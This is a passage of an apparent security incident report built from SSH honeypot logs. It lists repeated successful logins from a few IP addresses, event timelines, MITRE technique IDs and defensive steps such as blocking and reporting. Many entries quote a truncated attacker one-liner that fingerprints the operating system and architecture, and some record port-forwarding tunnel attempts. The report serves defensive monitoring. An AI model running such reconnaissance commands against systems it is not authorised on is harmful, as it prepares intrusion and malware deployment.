| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:57:07` | `cowrie.session.connect` |
| `2026-07-24 18:57:07` | `cowrie.client.version` |
| `2026-07-24 18:57:07` | `cowrie.client.kex` |
| `2026-07-24 18:57:09` | `cowrie.login.success` |
| `2026-07-24 18:57:11` | `cowrie.session.params` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.success` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.command.input` |
| `2026-07-24 18:57:11` | `cowrie.log.closed` |
| `2026-07-24 18:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b02a40d826

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:57 |
| **Last Seen** | 2026-07-24 18:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:57:19` | `cowrie.session.connect` |
| `2026-07-24 18:57:20` | `cowrie.client.version` |
| `2026-07-24 18:57:20` | `cowrie.client.kex` |
| `2026-07-24 18:57:25` | `cowrie.login.success` |
| `2026-07-24 18:57:27` | `cowrie.session.params` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.success` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:27` | `cowrie.command.input` |
| `2026-07-24 18:57:28` | `cowrie.log.closed` |
| `2026-07-24 18:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ba2d61710b

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-07-24 18:57 |
| **Last Seen** | 2026-07-24 18:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:57:19` | `cowrie.session.connect` |
| `2026-07-24 18:57:20` | `cowrie.client.version` |
| `2026-07-24 18:57:20` | `cowrie.client.kex` |
| `2026-07-24 18:57:20` | `cowrie.login.success` |
| `2026-07-24 18:57:20` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9a093c383f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:58 |
| **Last Seen** | 2026-07-24 18:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:58:27` | `cowrie.session.connect` |
| `2026-07-24 18:58:28` | `cowrie.client.version` |
| `2026-07-24 18:58:28` | `cowrie.client.kex` |
| `2026-07-24 18:58:33` | `cowrie.login.success` |
| `2026-07-24 18:58:35` | `cowrie.session.params` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.success` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:35` | `cowrie.command.input` |
| `2026-07-24 18:58:36` | `cowrie.log.closed` |
| `2026-07-24 18:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a21ca97dcaf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:58 |
| **Last Seen** | 2026-07-24 18:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:58:35` | `cowrie.session.connect` |
| `2026-07-24 18:58:35` | `cowrie.client.version` |
| `2026-07-24 18:58:36` | `cowrie.client.kex` |
| `2026-07-24 18:58:37` | `cowrie.login.success` |
| `2026-07-24 18:58:38` | `cowrie.session.params` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.success` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:38` | `cowrie.command.input` |
| `2026-07-24 18:58:39` | `cowrie.log.closed` |
| `2026-07-24 18:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ea1fa06fc0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:59 |
| **Last Seen** | 2026-07-24 18:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:59:36` | `cowrie.session.connect` |
| `2026-07-24 18:59:37` | `cowrie.client.version` |
| `2026-07-24 18:59:37` | `cowrie.client.kex` |
| `2026-07-24 18:59:41` | `cowrie.login.success` |
| `2026-07-24 18:59:44` | `cowrie.session.params` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.success` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:44` | `cowrie.command.input` |
| `2026-07-24 18:59:45` | `cowrie.log.closed` |
| `2026-07-24 18:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea7bf214a15

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:00 |
| **Last Seen** | 2026-07-24 19:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:00:08` | `cowrie.session.connect` |
| `2026-07-24 19:00:09` | `cowrie.client.version` |
| `2026-07-24 19:00:09` | `cowrie.client.kex` |
| `2026-07-24 19:00:10` | `cowrie.login.success` |
| `2026-07-24 19:00:11` | `cowrie.session.params` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.success` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:11` | `cowrie.command.input` |
| `2026-07-24 19:00:12` | `cowrie.log.closed` |
| `2026-07-24 19:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b69a28e547

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-07-24 19:00 |
| **Last Seen** | 2026-07-24 19:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:00:33` | `cowrie.session.connect` |
| `2026-07-24 19:00:33` | `cowrie.client.version` |
| `2026-07-24 19:00:33` | `cowrie.client.kex` |
| `2026-07-24 19:00:36` | `cowrie.login.success` |
| `2026-07-24 19:00:36` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ed55ddad15

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-07-24 19:00 |
| **Last Seen** | 2026-07-24 19:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:00:42` | `cowrie.session.connect` |
| `2026-07-24 19:00:42` | `cowrie.client.version` |
| `2026-07-24 19:00:42` | `cowrie.client.kex` |
| `2026-07-24 19:00:44` | `cowrie.login.success` |
| `2026-07-24 19:00:45` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca23a4c6978e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:00 |
| **Last Seen** | 2026-07-24 19:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:00:45` | `cowrie.session.connect` |
| `2026-07-24 19:00:46` | `cowrie.client.version` |
| `2026-07-24 19:00:46` | `cowrie.client.kex` |
| `2026-07-24 19:00:50` | `cowrie.login.success` |
| `2026-07-24 19:00:53` | `cowrie.session.params` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.success` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:53` | `cowrie.command.input` |
| `2026-07-24 19:00:54` | `cowrie.log.closed` |
| `2026-07-24 19:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db2a74b9eb4b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:01 |
| **Last Seen** | 2026-07-24 19:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:01:42` | `cowrie.session.connect` |
| `2026-07-24 19:01:42` | `cowrie.client.version` |
| `2026-07-24 19:01:42` | `cowrie.client.kex` |
| `2026-07-24 19:01:44` | `cowrie.login.success` |
| `2026-07-24 19:01:46` | `cowrie.session.params` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.success` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.command.input` |
| `2026-07-24 19:01:46` | `cowrie.log.closed` |
| `2026-07-24 19:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed3e0f7f1ef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:01 |
| **Last Seen** | 2026-07-24 19:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:01:55` | `cowrie.session.connect` |
| `2026-07-24 19:01:56` | `cowrie.client.version` |
| `2026-07-24 19:01:56` | `cowrie.client.kex` |
| `2026-07-24 19:02:00` | `cowrie.login.success` |
| `2026-07-24 19:02:03` | `cowrie.session.params` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.success` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:03` | `cowrie.command.input` |
| `2026-07-24 19:02:04` | `cowrie.log.closed` |
| `2026-07-24 19:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f29fbf372013

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:03 |
| **Last Seen** | 2026-07-24 19:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:03:07` | `cowrie.session.connect` |
| `2026-07-24 19:03:07` | `cowrie.client.version` |
| `2026-07-24 19:03:07` | `cowrie.client.kex` |
| `2026-07-24 19:03:12` | `cowrie.login.success` |
| `2026-07-24 19:03:14` | `cowrie.session.params` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.success` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:14` | `cowrie.command.input` |
| `2026-07-24 19:03:16` | `cowrie.log.closed` |
| `2026-07-24 19:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b97efe0d1f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:03 |
| **Last Seen** | 2026-07-24 19:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:03:18` | `cowrie.session.connect` |
| `2026-07-24 19:03:18` | `cowrie.client.version` |
| `2026-07-24 19:03:18` | `cowrie.client.kex` |
| `2026-07-24 19:03:19` | `cowrie.login.success` |
| `2026-07-24 19:03:21` | `cowrie.session.params` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
| `2026-07-24 19:03:21` | `cowrie.command.success` |
| `2026-07-24 19:03:21` | `cowrie.command.input` |
